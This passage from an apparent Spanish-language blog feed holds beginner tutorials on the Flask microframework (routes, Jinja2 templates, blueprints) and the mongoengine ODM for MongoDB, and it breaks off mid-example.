&lt;h2&gt;Reflexiones&lt;/h2&gt;
&lt;p&gt;¿Os habéis fijado lo fácil que seria adoptar el módulo de noticias para otra aplicación?&lt;/p&gt;
&lt;p&gt;Solo necesitamos tener un repositorio de &lt;strong&gt;blueprints&lt;/strong&gt; listo para ser usado en proyectos nuevos. Si se piensan bien nuestros &lt;strong&gt;blueprints&lt;/strong&gt; serán &lt;strong&gt;reusables&lt;/strong&gt;. Algunos de ellos incluso se podrían convertir en &lt;strong&gt;extensiones&lt;/strong&gt;, pero eso es otra historia.&lt;/p&gt;</content><category term="python"></category><category term="framework"></category><category term="microframework"></category><category term="flask"></category><category term="blueprints"></category></entry><entry><title>Otro microframework en python: Flask</title><link href="http://www.linuxsysadmin.ml/2017/12/otro-microframework-en-python-flask.html" rel="alternate"></link><published>2017-12-04T10:00:00+01:00</published><updated>2017-12-04T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-12-04:/2017/12/otro-microframework-en-python-flask.html</id><summary type="html">&lt;p&gt;Cuando queremos hacer una nueva aplicación web podemos usar un &lt;em&gt;framework&lt;/em&gt; completo como &lt;strong&gt;django&lt;/strong&gt; o uno minimalista como &lt;strong&gt;bottle&lt;/strong&gt;. Entre ambos existe una amplia variedad de &lt;em&gt;frameworks&lt;/em&gt; que nos pueden aportar variedad y algunas de las funcionalidades más demandadas. En esta categoria podemos encontrar un &lt;em&gt;microframework&lt;/em&gt; muy interesante llamado &lt;strong&gt;Flask …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando queremos hacer una nueva aplicación web podemos usar un &lt;em&gt;framework&lt;/em&gt; completo como &lt;strong&gt;django&lt;/strong&gt; o uno minimalista como &lt;strong&gt;bottle&lt;/strong&gt;. Entre ambos existe una amplia variedad de &lt;em&gt;frameworks&lt;/em&gt; que nos pueden aportar variedad y algunas de las funcionalidades más demandadas. En esta categoria podemos encontrar un &lt;em&gt;microframework&lt;/em&gt; muy interesante llamado &lt;strong&gt;Flask&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;De hecho, este &lt;em&gt;framework&lt;/em&gt; es enormemente similar a &lt;a href="http://www.linuxsysadmin.ml/2017/05/desarrollando-aplicaciones-web-con-python-y-bottle.html"&gt;otro que ya vimos&lt;/a&gt;. Lo único que impide que ambos &lt;em&gt;frameworks&lt;/em&gt; se fusionen es un choque ideológico entre ambos autores, y su forma de afrontar la distribución del código fuente; mientras que el autor de &lt;strong&gt;bottle&lt;/strong&gt; mantiene la idea del fichero único, el de &lt;strong&gt;flask&lt;/strong&gt; cree firmemente en la necesidad de separar las capas dependiendo de su función.&lt;/p&gt;
&lt;p&gt;De esta forma, &lt;strong&gt;flask&lt;/strong&gt; es solo la unión de 3 grandes librerías del mismo autor:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;flask&lt;/strong&gt;: una librería que funciona como pegamento entre todas las demás&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;werkzeug&lt;/strong&gt;: posiblemente la mejor librería para tratar con el protocolo &lt;strong&gt;WSGI&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;jinja2&lt;/strong&gt;: el mejor motor de plantillas existente para &lt;strong&gt;python&lt;/strong&gt;, muy parecido al de &lt;strong&gt;django&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Este &lt;em&gt;framework&lt;/em&gt; no trabaja con ninguna capa de datos, dándonos la libertad para elegir la que más nos guste, y dándonos libertad para usar cualquier servicio de datos, sea SQL, NoSQL, u otros, incluso ninguno.&lt;/p&gt;
&lt;p&gt;Sin embargo, lo que realmente hace grande a este &lt;em&gt;framework&lt;/em&gt; son los &lt;strong&gt;blueprints&lt;/strong&gt;, que lo hacen extensible hasta límites insospechados, pero eso lo vermos más adelante. No nos olvidemos de mencionar la &lt;a href="http://flask.pocoo.org/docs/"&gt;magnífica documentación&lt;/a&gt; y estaremos trasteando con el &lt;em&gt;framework&lt;/em&gt; en menos de 2 horas.&lt;/p&gt;
&lt;p&gt;Y si he conseguido picar tu curiosidad, te recomiendo encarecidamente leerte el libre &lt;em&gt;online&lt;/em&gt; &lt;a href="https://exploreflask.com/en/latest/"&gt;Explore Flask&lt;/a&gt; que es muy interesante y algo más completo que este artículo.&lt;/p&gt;
&lt;h2&gt;Objetos y métodos básicos&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Flask&lt;/strong&gt;: Objeto principal del &lt;em&gt;framework&lt;/em&gt;, es una forma de aglutinar el &lt;em&gt;callable wsgi&lt;/em&gt; con un conjunto de rutas. Nuestra aplicación va a ser una instancia de este objeto.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;request&lt;/strong&gt;: Objeto que nos permite acceder a los datos referentes a la petición que nos han hecho. Incluye los parámetros GET, las cookies y cabeceras, entre otras cosas.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;response&lt;/strong&gt;: Objeto que nos permite modificar nuestras respuestas, añadiendo cabeceras, códigos de estado, cookies y otros conceptos.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;render_template&lt;/strong&gt;: Método que inyecta nuestro contexto a una plantilla y nos devuelve la respuesta ya formada, lista para devolverla.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;redirect&lt;/strong&gt;: Helper que nos permite devolver una redirección a otra URL en nuestro código.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;abort&lt;/strong&gt;: Helper que nos permite devolver estado de error desde nuestro controlador.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Una aplicación vacía&lt;/h2&gt;
&lt;p&gt;Vamos a crear una carpeta para contener nuestro proyecto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects$ mkdir myapp
gerard@atlantis:~/projects$ &lt;span class="nb"&gt;cd&lt;/span&gt; myapp/
gerard@atlantis:~/projects/myapp$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Siguiendo las buenas prácticas, vamos a trabajar con virtualenv, que nos servirá para poner nuestras librerías, que de momento se limitan al &lt;em&gt;framework&lt;/em&gt;. En adelante, es posible poner librerías para acceder a una base de datos, nuevos motores de plantillas y librerías más específicas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/myapp$ virtualenv .venv
New python executable in /home/gerard/projects/myapp/.venv/bin/python
Installing setuptools, pip, wheel...done.
gerard@atlantis:~/projects/myapp$ . .venv/bin/activate
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ pip install flask
...
Installing collected packages: itsdangerous, click, Werkzeug, MarkupSafe, Jinja2, flask
Successfully installed Jinja2-2.9.6 MarkupSafe-1.0 Werkzeug-0.12.2 click-6.7 flask-0.12.2 itsdangerous-0.24
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como queremos poder reproducir nuestro entorno usaremos pip freeze para guardar las dependencias, en vista a poderlas instalar en un futuro entorno real.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ pip freeze &amp;gt; requirements.txt
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lo mínimo para ejecutar una aplicación &lt;em&gt;WSGI compilant&lt;/em&gt; es un servidor WSGI y la aplicación misma. Una aplicación construida con &lt;strong&gt;flask&lt;/strong&gt; es básicamente una instancia del objeto &lt;em&gt;Flask&lt;/em&gt;, a la que iremos registrando rutas. De momento la dejamos vacía, lo que nos va a responder siempre un error 404.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat app.py
from flask import Flask

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Flask&lt;span class="o"&gt;(&lt;/span&gt;__name__&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En un entorno real, el servidor a usar sería otro, por ejemplo &lt;strong&gt;apache&lt;/strong&gt;, &lt;strong&gt;uwsgi&lt;/strong&gt; o &lt;strong&gt;gunicorn&lt;/strong&gt;, pero para desarrollar, podemos aprovecharnos del servidor integrado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ &lt;span class="nv"&gt;FLASK_DEBUG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;FLASK_APP&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;app.py flask run
 * Serving Flask app &lt;span class="s2"&gt;&amp;quot;app&amp;quot;&lt;/span&gt;
 * Forcing debug mode on
 * Running on http://127.0.0.1:5000/ &lt;span class="o"&gt;(&lt;/span&gt;Press CTRL+C to quit&lt;span class="o"&gt;)&lt;/span&gt;
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: &lt;span class="m"&gt;579&lt;/span&gt;-205-006
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para nuestra comodidad futura, vamos a poner el comando en un script, en el que podemos definir nuestras propias variables de entorno o aquellas que queramos aplicar estando en nuestro entorno de desarrollo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat server.sh
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nv"&gt;PYTHONDONTWRITEBYTECODE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="nv"&gt;FLASK_DEBUG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="nv"&gt;FLASK_APP&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;app.py &lt;span class="se"&gt;\&lt;/span&gt;
flask run --host &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0 --port &lt;span class="m"&gt;8080&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ chmod &lt;span class="m"&gt;755&lt;/span&gt; server.sh
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ ./server.sh
 * Serving Flask app &lt;span class="s2"&gt;&amp;quot;app&amp;quot;&lt;/span&gt;
 * Forcing debug mode on
 * Running on http://0.0.0.0:8080/ &lt;span class="o"&gt;(&lt;/span&gt;Press CTRL+C to quit&lt;span class="o"&gt;)&lt;/span&gt;
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: &lt;span class="m"&gt;579&lt;/span&gt;-205-006
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ya podemos dirigirnos a http://localhost:8080/ para comprobar un bonito error 404.&lt;/p&gt;
&lt;h2&gt;Registrando rutas a controladores&lt;/h2&gt;
&lt;p&gt;La idea es muy simple: se registran rutas a funciones que devuelven la respuesta resultado. Hay varias formas de añadir rutas a nuestra aplicación, pero la que más me gusta es el decorador.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat app.py
from flask import Flask

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Flask&lt;span class="o"&gt;(&lt;/span&gt;__name__&lt;span class="o"&gt;)&lt;/span&gt;

@app.route&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def home&lt;span class="o"&gt;()&lt;/span&gt;:
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;h1&amp;gt;Home page&amp;lt;/h1&amp;gt;&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma, todas las peticiones GET a / van a devolver una página HTML con el contenido retornado. El código de retorno es un 200 y el &lt;em&gt;content-type&lt;/em&gt; es &lt;em&gt;text/html&lt;/em&gt; por defecto, aunque se puede cambiar con el objeto &lt;em&gt;response&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Usando plantillas y segmentos de URL&lt;/h2&gt;
&lt;p&gt;No es una buena práctica poner en el controlador la respuesta HTML. Para eso, &lt;strong&gt;flask&lt;/strong&gt; nos ofrece el motor de plantillas &lt;strong&gt;jinja2&lt;/strong&gt;. También nos permite capturar parte de la URL como parámetros; veamos un ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat app.py
from flask import Flask, render_template

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Flask&lt;span class="o"&gt;(&lt;/span&gt;__name__&lt;span class="o"&gt;)&lt;/span&gt;

@app.route&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def home&lt;span class="o"&gt;()&lt;/span&gt;:
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;h1&amp;gt;Home page&amp;lt;/h1&amp;gt;&amp;#39;&lt;/span&gt;

@app.route&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/hello/&amp;lt;name&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def hello&lt;span class="o"&gt;(&lt;/span&gt;name&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="nv"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;nombre&amp;#39;&lt;/span&gt;: name,
    &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; render_template&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hello.html&amp;#39;&lt;/span&gt;, **data&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$ cat templates/hello.html
&amp;lt;p&amp;gt;Hola &lt;span class="o"&gt;{{&lt;/span&gt; nombre &lt;span class="o"&gt;}}&lt;/span&gt;&amp;lt;/p&amp;gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/myapp$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y de esta forma, todas las URLs de la forma &lt;em&gt;/hello/nombre&lt;/em&gt; capturará el segmento como &lt;em&gt;name&lt;/em&gt; y lo va a pasar a la funcion &lt;em&gt;render_template&lt;/em&gt; que hará lo que tenga que hacer con ella, que en este caso es pintarla.&lt;/p&gt;
&lt;p&gt;Algunas aplicaciones no necesitan plantillas HTML. Por ejemplo una API solo necesitaría convertir una expresión python en su equivalente JSON, mediante una función adecuada, que podemos ver como un motor de plantillas.&lt;/p&gt;
&lt;h2&gt;Blueprints&lt;/h2&gt;
&lt;p&gt;Las aplicaciones web tienden a crecer mucho, especialmente si planificamos funcionalidades de acuerdo a algún método ágil. En estos casos podemos contar con los &lt;strong&gt;blueprints&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Básicamente, un &lt;strong&gt;blueprint&lt;/strong&gt; es una manera de organizar tu aplicación en trozos, más pequeños y reusables. Como toda otra aplicación &lt;strong&gt;Flask&lt;/strong&gt;, es una colección de vistas, plantillas y otros elementos estáticos. A pesar de esto, un &lt;strong&gt;blueprint&lt;/strong&gt; no es una aplicación en sí misma, y debe ser registrado en una aplicación de verdad antes de que se pueda usar.&lt;/p&gt;
&lt;p&gt;La razón principal por la que deberíamos utilizar &lt;strong&gt;blueprints&lt;/strong&gt; es la de desacoplar nuestra aplicación en componentes más pequeños y reusables, encargándose cada uno de uno solo de los aspectos de la aplicación. Esto los hace mantenibles y más fáciles de &lt;em&gt;debuguear&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;En la práctica, los &lt;strong&gt;blueprints&lt;/strong&gt; han derivado en &lt;em&gt;extensiones&lt;/em&gt; genéricas que nos permiten trabajar con módulos preparados para sacarnos el trabajo duro de encima. Mis favoritos son &lt;strong&gt;Flask-Admin&lt;/strong&gt; y &lt;strong&gt;Flask-Mongoengine&lt;/strong&gt;, pero eso queda para otro artículo.&lt;/p&gt;</content><category term="python"></category><category term="framework"></category><category term="microframework"></category><category term="flask"></category></entry><entry><title>Un ODM para mongodb en python: mongoengine</title><link href="http://www.linuxsysadmin.ml/2017/11/un-odm-para-mongodb-en-python-mongoengine.html" rel="alternate"></link><published>2017-11-27T10:00:00+01:00</published><updated>2017-11-27T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-11-27:/2017/11/un-odm-para-mongodb-en-python-mongoengine.html</id><summary type="html">&lt;p&gt;Aquellos que hemos usado &lt;strong&gt;mongodb&lt;/strong&gt; desde &lt;strong&gt;python&lt;/strong&gt;, ya conocemos las virtudes de &lt;strong&gt;pymongo&lt;/strong&gt;. Sin embargo, este lenguaje es orientado a objetos, y trabajar con ellos hace nuestro código más simple y más legible. &lt;strong&gt;Mongoengine&lt;/strong&gt; es un ODM, una librería que se encarga de convertir objetos en documentos &lt;strong&gt;mongodb&lt;/strong&gt; y viceversa …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Aquellos que hemos usado &lt;strong&gt;mongodb&lt;/strong&gt; desde &lt;strong&gt;python&lt;/strong&gt;, ya conocemos las virtudes de &lt;strong&gt;pymongo&lt;/strong&gt;. Sin embargo, este lenguaje es orientado a objetos, y trabajar con ellos hace nuestro código más simple y más legible. &lt;strong&gt;Mongoengine&lt;/strong&gt; es un ODM, una librería que se encarga de convertir objetos en documentos &lt;strong&gt;mongodb&lt;/strong&gt; y viceversa.&lt;/p&gt;
&lt;p&gt;ODM son las siglas para &lt;em&gt;object to document mapper&lt;/em&gt;, y es el equivalente a un ORM (&lt;em&gt;object to relational mapper&lt;/em&gt;). La diferencia entre ambos conceptos es que los datos van a parar a la base de datos como un documento en contraposición a una base de datos relacional.&lt;/p&gt;
&lt;p&gt;El objetivo de la librería es convertir nuestros modelos en objetos de &lt;strong&gt;python&lt;/strong&gt; de forma declarativa. Toda la magia del acceso a la base de datos se hace de forma automática.&lt;/p&gt;
&lt;p&gt;Este ODM está realmente bien hecho; soporta tipos de campos, herencia de clases, referencias a otros documentos e incluso listas en sus campos. Todo ello creando los índices necesarios para los accesos habituales, y la posibilidad de declarar otros índices que creamos necesarios.&lt;/p&gt;
&lt;h2&gt;Declaración de los modelos&lt;/h2&gt;
&lt;p&gt;Veamos un ejemplo, con un subconjunto de los datos de un &lt;em&gt;blog&lt;/em&gt; estándar. Para ello, el primer paso es declarar nuestros modelos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/mongoengine$ cat models.py 
import mongoengine


def connect&lt;span class="o"&gt;(&lt;/span&gt;url&lt;span class="o"&gt;)&lt;/span&gt;:
    mongoengine.connect&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;url&lt;span class="o"&gt;)&lt;/span&gt;


class Author&lt;span class="o"&gt;(&lt;/span&gt;mongoengine.Document&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="nv"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; mongoengine.StringField&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="nv"&gt;meta&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;collection&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;authors&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;


class Page&lt;span class="o"&gt;(&lt;/span&gt;mongoengine.Document&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="nv"&gt;title&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; mongoengine.StringField&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="nv"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; mongoengine.StringField&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="nv"&gt;meta&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;collection&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;pages&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;allow_inheritance&amp;#39;&lt;/span&gt;: True&lt;span class="o"&gt;}&lt;/span&gt;


class Post&lt;span class="o"&gt;(&lt;/span&gt;Page&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="nv"&gt;author&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; mongoengine.ReferenceField&lt;span class="o"&gt;(&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;Author&amp;#39;&lt;/span&gt;,
        &lt;span class="nv"&gt;reverse_delete_rule&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;mongoengine.CASCADE
    &lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="nv"&gt;date&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; mongoengine.DateTimeField&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="nv"&gt;tags&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; mongoengine.ListField&lt;span class="o"&gt;(&lt;/span&gt;mongoengine.StringField&lt;span class="o"&gt;())&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/mongoengine$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Habéis visto algunas de las funcionalidades más interesantes?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Subclases mediante terminología &lt;strong&gt;python&lt;/strong&gt; habitual.&lt;/li&gt;
&lt;li&gt;Varios tipos de datos para los campos.&lt;/li&gt;
&lt;li&gt;Referencias a otros objetos que se cargan de forma &lt;em&gt;lazy&lt;/em&gt;, es decir, cuando se accede al campo se lanza una nueva consulta.&lt;/li&gt;
&lt;li&gt;Reglas de tratamiento automático de referencias para objetos eliminados.&lt;/li&gt;
&lt;li&gt;Campos tipo lista, con tipología de los elementos de la misma. En el ejemplo son campos tipo &lt;code&gt;StringField&lt;/code&gt; pero podrían ser cualquiera, como por ejemplo &lt;code&gt;ReferenceField&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Uso de nuestros modelos&lt;/h2&gt;
&lt;p&gt;Para crear nuestros objetos, basta hacerlo como se haría en &lt;strong&gt;python&lt;/strong&gt; normal. Solo hay que tener en cuenta que los cambios no acabarán en la base de datos hasta que invoquemos el método &lt;code&gt;save&lt;/code&gt; del objeto tipo &lt;code&gt;Document&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/mongoengine$ cat carga.py 
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;

from models import Author, Page, Post, connect
from datetime import datetime

connect&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mongodb://localhost:27017/test&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

Page&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;title&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;About&amp;#39;&lt;/span&gt;, &lt;span class="nv"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;blah&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.save&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Author&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Gerard&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.save&lt;span class="o"&gt;()&lt;/span&gt;
Post&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;title&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Hello world&amp;#39;&lt;/span&gt;, &lt;span class="nv"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;lorem ipsum&amp;#39;&lt;/span&gt;, &lt;span class="nv"&gt;author&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;a,
     &lt;span class="nv"&gt;date&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;datetime.utcnow&lt;span class="o"&gt;()&lt;/span&gt;, &lt;span class="nv"&gt;tags&lt;/span&gt;&lt;span class="o"&gt;=[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;world&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;])&lt;/span&gt;.save&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/mongoengine$ ./carga.py 
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/mongoengine$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y el resultado es un esquema de base de datos bastante limpio, y sin ningún tipo de &lt;em&gt;overhead&lt;/em&gt;. Solo hay que cargar con un campo adicional para diferenciar el tipo de objeto en el caso de herencia.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt; use &lt;span class="nb"&gt;test&lt;/span&gt;
switched to db &lt;span class="nb"&gt;test&lt;/span&gt;
&amp;gt; show collections
authors
pages
&amp;gt; db.authors.find&lt;span class="o"&gt;()&lt;/span&gt;.pretty&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : ObjectId&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;59b1a4bb093f961b0aa6ed00&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;Gerard&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
&amp;gt; db.pages.find&lt;span class="o"&gt;()&lt;/span&gt;.pretty&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
